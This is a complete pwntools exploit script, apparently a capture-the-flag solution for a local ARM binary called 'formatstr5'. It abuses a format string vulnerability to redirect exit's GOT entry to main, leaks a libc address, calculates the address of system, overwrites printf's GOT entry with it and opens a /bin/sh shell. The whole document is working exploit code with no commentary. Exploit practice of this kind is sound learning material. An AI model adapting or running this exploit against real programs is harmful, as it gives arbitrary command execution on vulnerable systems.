from pwn import *

p = process('./formatstr5')
e = ELF('./formatstr5')
libc = ELF('/lib/arm-linux-gnueabihf/libc.so.6')

#context.log_level = 5

exit_got = e.got['exit']
print('exit_got : ' + str(hex(exit_got)))
main = e.symbols['main']
printf_got = e.got['printf']
__libc_start_main_offset = libc.symbols['__libc_start_main']
print('__libc_start_main : ' + hex(__libc_start_main_offset))
system_offset = libc.symbols['system']
print('system : ' + hex(system_offset))

# leak + exit_got -> main
payload = fmtstr_payload(offset=4, writes={exit_got: main})
p.sendline(payload)
sleep(2)
payload = 'leaked:%135$p'
p.sendline(payload)
# get system_addr
p.recvuntil("leaked:")
leak = int(p.recv(10), 16)
#leak = 0x76e6a718
print('leak : ' + hex(leak))
libc_base = leak - __libc_start_main_offset - 268
print('libc_base : ' + hex(libc_base))
system = libc_base + system_offset
print('system : ' + hex(system))
sleep(2)
payload = fmtstr_payload(4, {printf_got: system})
p.send(payload)
p.send('/bin/sh')
p.interactive()

